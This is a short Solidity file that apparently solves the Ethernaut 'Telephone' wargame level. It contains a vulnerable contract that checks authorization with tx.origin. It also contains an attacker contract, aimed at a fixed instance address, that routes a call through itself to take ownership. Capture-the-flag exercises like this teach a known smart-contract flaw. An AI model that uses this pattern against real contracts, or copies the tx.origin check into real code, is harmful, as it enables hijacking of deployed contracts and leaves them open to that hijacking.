// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract PseudoTelephone {
    Telephone public telephoneContract =
        Telephone(0x4e737732c90FFa75DAbE00948Bc222c18D9F4820);

    function changeOwner(address _owner) public {
        telephoneContract.changeOwner(_owner);
    }
}
